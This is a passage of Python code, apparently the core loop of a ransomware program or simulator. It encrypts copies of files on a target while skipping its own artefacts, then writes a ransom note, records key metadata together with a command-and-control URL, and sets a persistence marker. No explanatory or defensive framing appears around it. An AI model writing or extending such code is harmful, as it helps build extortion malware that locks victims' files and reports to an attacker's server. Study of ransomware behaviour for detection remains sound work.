        if path.name.endswith(".enc"):
            continue
        if path.name in {
            NOTE_FILE.name,
            PERSISTENCE_MARKER.name,
            KEY_MANIFEST.name,
        }:
            continue
        records.append(encrypt_file_copy(path, key))

    write_ransom_note(target, note)
    record_key_metadata(records, c2_url)
    record_persistence(target)


